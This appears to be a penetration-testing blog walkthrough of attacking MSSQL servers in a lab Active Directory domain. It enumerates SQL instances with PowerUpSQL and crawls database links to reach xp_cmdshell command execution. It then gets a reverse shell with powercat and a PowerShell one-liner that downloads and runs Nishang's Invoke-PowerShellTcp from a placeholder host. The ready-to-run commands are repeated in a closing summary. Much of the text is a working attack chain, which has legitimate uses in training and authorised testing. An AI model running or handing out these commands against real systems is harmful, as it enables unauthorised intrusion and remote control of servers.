---
title: "Active Directory - MSSQL Server"
tags: [Metodologies]
categories: ActiveDirectory
mermaid: true
image: https://www.safesystems.com/wp-content/uploads/2020/04/Microsofts-LDAP-Security-Update-and-the-Impact-on-Financial-Institutions-Today-Header-Blog-Image.png
---

# Active Directory - MSSQL Server

Here you will find some commands to explore Active Directory with MSSQL Server

Commands linked to msql instances in Windows AD.

Hope you enjoy.

# Summary

- [Active Directory - MSSQL Server](#active-directory---mssql-server)
- [Summary](#summary)
- [Initial Consideration](#initial-consideration)
- [SQL Server Enumeration](#sql-server-enumeration)
  - [Listing SPN](#listing-spn)
  - [Verifying Server Connectivity](#verifying-server-connectivity)
  - [Testing the Chain](#testing-the-chain)
  - [RCE](#rce)
  - [Reverse Shell](#reverse-shell)
- [Conclusion](#conclusion)
  - [Commands Used](#commands-used)

![](https://0x4rt3mis.github.io/assets/img/active-enum/mssql-server.png)

# Initial Consideration

Now let's start the MSSQL Server enumeration of that AD, every AD will have a SQL server, since that's where the data is stored.

The tool I'll use for this section is PowerUpSql.ps1, a script written in PowerShell that enables fast and accurate enumeration of an AD's SQL server.

READ THE REFERENCE POST, VERY IMPORTANT FOR UNDERSTANDING WHAT WILL BE PERFORMED HERE

*Reference:*

[Link 1](https://blog.netspi.com/powerupsql-powershell-toolkit-attacking-sql-server/)

# SQL Server Enumeration

The initial idea here is to have any type of access, even if I publish to the SQL database, with this access we can scale privileges within it and become SA (sysadmin) within it, for example enabling xp_cmdshell and executing cmd commands within the SQL machine and get a reverse shell!

## Listing SPN

Tool used: PowerUpSql.ps1

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1)

Listing all Lab SQL that have SPN (Service Principal Name) enabled

```ps1
Get-SQLInstanceDomain
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/sql.png)

We have a total of 5 SQL instances running in this lab.

## Verifying Server Connectivity

Now we should check if any of them are accessible, and if they are accessible, we can log in with some user

```ps1
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/sql1.png)

We verified that we have an Affordable one! So we can test commands through her chain now

## Testing the Chain

To see if we have any type of command execution inside the sql server, we have to test its chain, and see if at any of these points we have command execution

```ps1
Get-SQLServerLinkCrawl -Instance Instancia_acessível
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/sql2.png)

We've found that it makes a chain at various points, so it's very likely that we'll have some kind of RCE somewhere in this chain.

## RCE

```ps1
Get-SQLServerLinkCrawl -Instance ACCESIBLE_ONE -Query "exec master..xp_cmdshell 'whoami'" | ft
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/sql3.png)

We get RCE in it

## Reverse Shell

Now let's get a reverse shell on it!

We will use Nishang's `Invoke-PowerShellTCP.ps1`

[PowerShellTCP](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

The `HFS` to host your web server where the remote server will make requests

[HFS](https://www.rejetto.com/hfs/)

And the `powercat` to receive the reverse connection

[PowerCat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

We set powercat on port 443 to receive the reverse connection

```ps1
powercat -l -v -p 443 -t 1000
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/rev.png)

We fix it (we put the function call at the end of it to automatically run the reverse shell) and upload the Invoke-PowerShellTCP.ps1 into the HFS

![](https://0x4rt3mis.github.io/assets/img/active-enum/rev1.png)

Now we call crawl our reverse shell

```ps1
Get-SQLServerLinkCrawl -Instance ACCESIBLE_ONE -Query "exec master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://x.x.x.x/Invoke-PowerShellTCP.ps1'')'" | ft
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/rev2.png)

We received the machine's reverse connection

![](https://0x4rt3mis.github.io/assets/img/active-enum/rev3.png)

# Conclusion

Ready! We got a reverse shell via a database link inside MSSQL

## Commands Used

```ps1
Get-SQLInstanceDomain
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10
Get-SQLServerLinkCrawl -Instance ACCESIBLE_ONE
Get-SQLServerLinkCrawl -Instance ACCESIBLE_ONE -Query "exec master..xp_cmdshell 'whoami'" | ft
powercat -l -v -p 443 -t 1000
Get-SQLServerLinkCrawl -Instance ACCESIBLE_ONE -Query "exec master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://x.x.x.x/Invoke-PowerShellTCP.ps1'')'" | ft
```